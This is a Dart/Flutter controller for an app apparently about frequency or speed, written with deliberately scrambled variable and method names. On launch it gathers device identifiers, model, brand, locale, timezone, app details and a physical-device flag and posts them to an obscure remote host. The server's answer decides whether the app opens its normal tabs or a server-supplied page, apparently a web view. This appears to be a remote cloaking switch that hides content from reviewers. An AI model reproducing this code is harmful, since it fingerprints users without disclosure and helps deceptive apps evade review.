import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class FreqHomeLogic extends GetxController {

  var vukiwtymrg = RxBool(false);
  var wfxdnb = RxBool(true);
  var amcqxo = RxString("");
  var silas = RxBool(false);
  var runolfsdottir = RxBool(true);
  final dsocmrjlzw = Dio();


  InAppWebViewController? webViewController;

  dynamic rgkjhi(){
    final qzabirkc = InternetConnectionChecker.instance;
    final jglaeiryb = qzabirkc.onStatusChange.skip(1).listen(
          (InternetConnectionStatus dgivpckaq) {
        if (dgivpckaq == InternetConnectionStatus.connected) {
          wkxdaue();
        } else {
          Get.toNamed('/freq_wrong')?.then((_){
            wkxdaue();
          });
        }
      },
    );
    return jglaeiryb;
  }

  Future<bool> eqcbkmh() async {
    var jueixlf = await InternetConnectionChecker.instance.hasConnection;
    if(!jueixlf){
      Get.toNamed('/freq_wrong')?.then((_){
        wkxdaue();
      });
    }
    return jueixlf;
  }

  @override
  void onInit() {
    super.onInit();
    rgkjhi();
    wkxdaue();
  }


  Future<void> wkxdaue() async {

    var oygblc = await eqcbkmh();
    if(!oygblc){
      return;
    }

    silas.value = true;
    runolfsdottir.value = true;
    wfxdnb.value = false;

    dsocmrjlzw.post("https://mv.cbackit.com/exjuqfvlygistko",data: await yhsagrml()).then((value) {
      var xysalcop = value.data["xysalcop"] as String;
      var sdwbtxml = value.data["sdwbtxml"] as bool;
      if (sdwbtxml) {
        amcqxo.value = xysalcop;
        idella();
      } else {
        hermiston();
      }
    }).catchError((e) {
      wfxdnb.value = true;
      runolfsdottir.value = true;
      silas.value = false;
    });
  }

  Future<Map<String, dynamic>> yhsagrml() async {
    final DeviceInfoPlugin gabkz = DeviceInfoPlugin();
    PackageInfo bfyp_mjlzfuco = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var cvmz = Platform.localeName;
    var crlq = currentTimeZone;

    var exrgtp = bfyp_mjlzfuco.packageName;
    var amdli = bfyp_mjlzfuco.version;
    var ferxyh = bfyp_mjlzfuco.buildNumber;

    var fudqew = bfyp_mjlzfuco.appName;
    var qwhpvoc = "";
    var lypcrqsi  = "";
    var hcbym = "";
    var alexandriaHilpert = "";
    var hildegardWest = "";
    var devynMraz = "";


    var hxrwmva = "";
    var bkflqte = false;

    if (GetPlatform.isAndroid) {
      hxrwmva = "android";
      var eiqcamg = await gabkz.androidInfo;

      hcbym = eiqcamg.brand;

      qwhpvoc  = eiqcamg.model;
      lypcrqsi = eiqcamg.id;

      bkflqte = eiqcamg.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hxrwmva = "ios";
      var zrbfsu = await gabkz.iosInfo;
      hcbym = zrbfsu.name;
      qwhpvoc = zrbfsu.model;

      lypcrqsi = zrbfsu.identifierForVendor ?? "";
      bkflqte  = zrbfsu.isPhysicalDevice;
    }

    var res = {
      "fudqew": fudqew,
      "alexandriaHilpert" : alexandriaHilpert,
      "amdli": amdli,
      "lypcrqsi": lypcrqsi,
      "exrgtp": exrgtp,
      "qwhpvoc": qwhpvoc,
      "crlq": crlq,
      "hcbym": hcbym,
      "cvmz": cvmz,
      "hxrwmva": hxrwmva,
      "bkflqte": bkflqte,
      "ferxyh": ferxyh,
      "hildegardWest" : hildegardWest,
      "devynMraz" : devynMraz,

    };
    return res;
  }

  Future<void> hermiston() async {
    Get.offNamed("/freq_tab");
  }

  Future<void> idella() async {
    Get.offNamed("/freq_speed");
  }

  @override
  void dispose() {
    rgkjhi().cancel();
    super.dispose();
  }

}
